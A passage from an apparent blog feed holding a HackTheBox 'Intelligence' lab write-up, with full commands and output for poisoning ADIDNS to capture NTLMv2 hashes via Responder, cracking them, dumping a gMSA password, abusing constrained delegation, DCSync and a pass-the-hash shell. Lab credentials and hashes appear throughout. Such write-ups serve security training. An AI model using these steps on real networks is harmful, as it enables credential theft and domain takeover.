    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ smbmap -H 10.10.10.248 -u <span class="s1">&#39;Tiffany.Molina&#39;</span> -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
</span></span><span class="line"><span class="cl">        Disk                                                    Permissions     Comment
</span></span><span class="line"><span class="cl">        ----                                                    -----------     -------
</span></span><span class="line"><span class="cl">        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class="line"><span class="cl">        C$                                                      NO ACCESS       Default share
</span></span><span class="line"><span class="cl">        IPC$                                                    READ ONLY       Remote IPC
</span></span><span class="line"><span class="cl">        IT                                                      READ ONLY
</span></span><span class="line"><span class="cl">        NETLOGON                                                READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        SYSVOL                                                  READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        Users                                                   READ ONLY</span></span></code></pre>
</figure><p>It turns out I can read the flag from the <code>Users</code> share.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/Users -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls Tiffany.Molina<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  user.txt                           AR       <span class="m">34</span>  Thu Jul <span class="m">15</span> 08:17:40 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444029</span> blocks available</span></span></code></pre>
</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="access-as-tedgraves">Access as Ted.Graves</h3>
<h4 id="it-share">IT share</h4>
<p>On the <code>IT</code> share, there is a PowerShell script called <code>downdetector.ps1</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/IT -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  downdetector.ps1                    A     <span class="m">1046</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444112</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget downdetector.ps1 
</span></span><span class="line"><span class="cl">Get file downdetector.ps1? y
</span></span><span class="line"><span class="cl">getting file <span class="se">\d</span>owndetector.ps1 of size <span class="m">1046</span> as downdetector.ps1 <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.6 KiloBytes/sec<span class="o">)</span></span></span></code></pre>
</figure><p>According to the comment it is said that this script is used to check web server status.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check web server status. Scheduled to run every 5min</span>
</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span> 
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$record</span> <span class="k">in</span> <span class="nb">Get-ChildItem</span> <span class="s2">&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Name</span> <span class="o">-like</span> <span class="s2">&#34;web*&#34;</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nv">$request</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://</span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">&#34;</span> <span class="n">-UseDefaultCredentials</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(.</span><span class="py">StatusCode</span> <span class="o">-ne</span> <span class="mf">200</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nb">Send-MailMessage</span> <span class="n">-From</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-To</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-Subject</span> <span class="s2">&#34;Host: </span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2"> is down&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
</figure><p>If I re-query this line <code>DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb</code> with a filter of <code>name=web*</code> using <code>ldapsearch</code>, it returns the following record.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s1">&#39;Tiffany.Molina@intelligence.htb&#39;</span> -w <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="s2">&#34;name=web*&#34;</span>
</span></span><span class="line"><span class="cl">dn: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intell
</span></span><span class="line"><span class="cl"> igence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">objectClass: top
</span></span><span class="line"><span class="cl">objectClass: dnsNode
</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDns
</span></span><span class="line"><span class="cl"> Zones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">instanceType: <span class="m">4</span>
</span></span><span class="line"><span class="cl">whenCreated: 20210716071327.0Z
</span></span><span class="line"><span class="cl">whenChanged: 20210716071707.0Z
</span></span><span class="line"><span class="cl">uSNCreated: <span class="m">102869</span>
</span></span><span class="line"><span class="cl">uSNChanged: <span class="m">102872</span>
</span></span><span class="line"><span class="cl">showInAdvancedViewOnly: TRUE
</span></span><span class="line"><span class="cl">name: weboops
</span></span><span class="line"><span class="cl">objectGUID:: JGYq3NUoGU24w9fR4hg/6Q<span class="o">==</span>
</span></span><span class="line"><span class="cl">dnsRecord:: <span class="nv">CAAAAAUAAABMAAAAAAAAAAAAAAAAAAAA9mT1lRJ61wE</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">objectCategory: <span class="nv">CN</span><span class="o">=</span>Dns-Node,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">dSCorePropagationData: 16010101000000.0Z
</span></span><span class="line"><span class="cl">dNSTombstoned: TRUE
</span></span><span class="line"><span class="cl">dc: weboops</span></span></code></pre>
</figure><p>So the script basically looks for DNS records that begin with <code>web*</code>. For each discovered record, it performs an HTTP request to check if the record is active. And if the response code is not 200, the script sends an email notification to Ted Graves.</p>
<p>The key take away here is the wildcard (<code>*</code>).</p>
<h4 id="stealing-ntlmv2-response-via-adidns">Stealing NTLMv2 Response via ADIDNS</h4>
<p>According to <a href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/"target="_blank" rel="noopener noreferrer"
>this blog</a>, in Active Directory (AD), it&rsquo;s the default behavior that any authenticated user can create a new DNS record (ADIDNS). By knowing how the previous script works, it is possible to abuse this feature.</p>
<p>Here&rsquo;s the concept: I attempted to create a DNS record (subdomain) under the <code>intelligence.htb</code> that begins with &lsquo;web*&rsquo;. The purpose was to have the script encounter the record I created during its next execution. This way, it would trigger NTLM authentication as the <code>Invoke-WebRequest</code> command was used with the <code>-UseDefaultCredentials</code> flag.</p>
<p>A well-known security researcher, <a href="https://dirkjanm.io/"target="_blank" rel="noopener noreferrer"
>Dirk-jan</a>, has developed a handy tool called <code>dnstool.py</code> specifically designed for interacting with ADIDNS. This tool is included in the <code>Krbrelayx</code> repository, so I&rsquo;ll simply clone the repository onto my machine.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «/opt» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/dirkjanm/krbrelayx.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> krbrelayx
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;krbrelayx&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 98, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">98</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">98</span>
</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>98/98<span class="o">)</span>, 65.76 KiB <span class="p">|</span> 426.00 KiB/s, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>48/48<span class="o">)</span>, <span class="k">done</span>.</span></span></code></pre>
</figure><p>Now I can use the tool to add a new ADIDNS record. This record points to my machine IP.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 dnstool.py -u intelligence.htb<span class="se">\\</span>Tiffany.Molina -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -r <span class="s1">&#39;web-iamf.intelligence.htb&#39;</span> -a add -d 10.10.14.75 10.10.10.248 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connecting to host...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Binding to host
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl">/opt/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve<span class="o">()</span> instead
</span></span><span class="line"><span class="cl">  <span class="nv">res</span> <span class="o">=</span> dnsresolver.query<span class="o">(</span>zone, <span class="s1">&#39;SOA&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Adding new record
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> LDAP operation completed successfully</span></span></code></pre>
</figure><p>At the same time, I&rsquo;ll also start the Responder. Shortly after it runs, the Ted.Graves hash appear.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ sudo responder -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...                                                                                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Client   : 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Username : intelligence<span class="se">\T</span>ed.Graves
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Hash     : Ted.Graves::intelligence:4cca110e84677c33:3A689C04E699DF8F6E1B16A599576ABA:0101000000000000E700D4082B7AD7012AF2C454A91E32400000000002000800340039003100540001001E00570049004E002D00500032003300360049003800390058003100530046000400140034003900310054002E004C004F00430041004C0003003400570049004E002D00500032003300360049003800390058003100530046002E0034003900310054002E004C004F00430041004C000500140034003900310054002E004C004F00430041004C000800300030000000000000000000000000200000AF0854B4C9903CBE8251A0173036E36C4E1F4A5399C97563C3922EC707733A310A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D00690061006D0066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000</span></span></code></pre>
</figure><h4 id="cracking-the-hash">Cracking the Hash</h4>
<p>The hash can be cracked with <code>hashcat</code></p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">5600</span> hashes/intelligence-ted.graves.hash ../../rockyou.txt -O                     ✘ INT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e699df8f6e1b16a599576aba:..<span class="o">[</span>SNIP<span class="o">]</span>..:Mr.Teddy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: NetNTLMv2
</span></span><span class="line"><span class="cl">Hash.Target......: TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e...000000
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure><p>The credentials are valid</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.248 -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> 
</span></span><span class="line"><span class="cl">SMB         10.10.10.248    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span></span></span></code></pre>
</figure><h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
<p>Even with user <code>Ted.Graves</code>, I still have no shell access. From here, I&rsquo;ll use BloodHound to explore more about the object relationships. I&rsquo;ll  use the Python ingestor.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «BloodHound.py» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 bloodhound.py -c All -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248
</span></span><span class="line"><span class="cl">INFO: Found AD domain: intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> computers
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">42</span> users
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">54</span> groups
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
</span></span><span class="line"><span class="cl">INFO: Querying computer: svc_int.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Querying computer: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Skipping enumeration <span class="k">for</span> svc_int.intelligence.htb since it could not be resolved.
</span></span><span class="line"><span class="cl">INFO: Done in 00M 21S</span></span></code></pre>
</figure><p>Using the pre-built analytics queries “Shortest Path from Owned Principal” reveals that user <code>Ted.Graves</code> has <code>readGMSAPassword</code> permission on a service account called <code>SVC_INT</code>. And the service account has <code>AllowedToDelegate</code> permission (constrained delegation) on the DC/Machine.</p>
<p><div class="img-container"><img src="imgs/image-20210716110136841.png" alt="image-20210716110136841"  /></div>
</p>
<h4 id="read-svc_init-password">Read SVC_INIT Password</h4>
<p>According to the help feature, <code>readGMSAPassword</code> allows you to retrieve GMSA (Group Managed Service Account) password. I&rsquo;ll also note that the password might be changed after some periods just like computer account (default 30 days).</p>
<p><div class="img-container"><img src="imgs/image-20210716110314851.png" alt="image-20210716110314851"  /></div>
</p>
<p>The author of this box has already created a tool for abusing this permission: <a href="https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py"target="_blank" rel="noopener noreferrer"
>gMSADumper.py</a>. Running it retuns the password of <code>svc_int$</code> in the form of NT hash.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ./gMSADumper.py -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Users or groups who can <span class="nb">read</span> password <span class="k">for</span> svc_int$:
</span></span><span class="line"><span class="cl"> &gt; DC$
</span></span><span class="line"><span class="cl"> &gt; itsupport
</span></span><span class="line"><span class="cl">svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2</span></span></code></pre>
</figure><p>Since the password is managed by the DC, I don&rsquo;t have to try to crack it.</p>
<h4 id="abusing-constrained-delegation---silver-ticket">Abusing Constrained Delegation -&gt; Silver Ticket</h4>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation"target="_blank" rel="noopener noreferrer"
>This site</a> explains what a constrained delegation is:</p>
<blockquote>
<p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it&rsquo;s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</p>
</blockquote>
<p>In this case, the service account <code>svc_int</code> can impersonate the domain admin and authenticate to <code>WWW/DC.INTELLIGENCE.HTB</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s2">&#34;Ted.Graves@intelligence.htb&#34;</span> -w <span class="s2">&#34;Mr.Teddy&#34;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;CN=svc_int,CN=Managed ServiceDC=intelligence,DC=htb&#34;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure><p>With that, I can abuse this permission and perform <a href="https://attack.mitre.org/techniques/T1558/002/"target="_blank" rel="noopener noreferrer"
>Silver Ticket</a> attack, I&rsquo;ll use <code>impacket-getST</code> tool, but the result says clock skew too great.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ impacket-getST <span class="s1">&#39;intelligence.htb/svc_int$&#39;</span>  -spn <span class="s1">&#39;WWW\dc.intelligence.htb&#39;</span> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl">Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span></span></span></code></pre>
</figure><p>To resolve that, I&rsquo;ll need to synchronize my machine time with the DC. This can be done with <code>ntpdate</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo apt install ntpdate <span class="o">&amp;&amp;</span> sudo ntpdate 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="m">18</span> Jul 14:57:39 ntpdate<span class="o">[</span>63324<span class="o">]</span>: adjust <span class="nb">time</span> server 10.10.10.248 offset +0.001305 sec</span></span></code></pre>
</figure><p>On the next attempt, I have obtained the admin ticket (TGS).</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75»
</span></span><span class="line"><span class="cl">$ impacket-getST -spn <span class="s1">&#39;WWW/dc.intelligence.htb&#39;</span> -impersonate administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int<span class="se">\$</span>
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating administrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2self
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2Proxy
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in administrator.ccache</span></span></code></pre>
</figure><h4 id="dcsync">DCSync</h4>
<p>Although the admin ticket was actually requested for <code>WWW\dc.intelligence.htb</code>, it actually can be used for other service, like DRS (Directory Replication Service) for DCSync attack.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache <span class="o">&amp;&amp;</span> impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:2362bc3191f23732
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...</span></span></code></pre>
</figure><h4 id="shell-access">Shell Access</h4>
<p>With the administrator hash, I can use WinRM to get a shell access</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.248 -u <span class="s1">&#39;administrator&#39;</span> -H <span class="s1">&#39;9075113fe16cf74f7c0f9b27e882dad3&#39;</span>        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">dc
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::a57a:d94f:fa40:87e6
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::a57a:d94f:fa40:87e6%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.248
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.254.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2</span></span></code></pre>
</figure>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Dynstr</title>
      <link>https://fahmifj.github.io/ctf/hackthebox/dynstr/</link>
      <pubDate>Mon, 18 Oct 2021 03:04:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hackthebox/dynstr/</guid>
      <description>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</description>
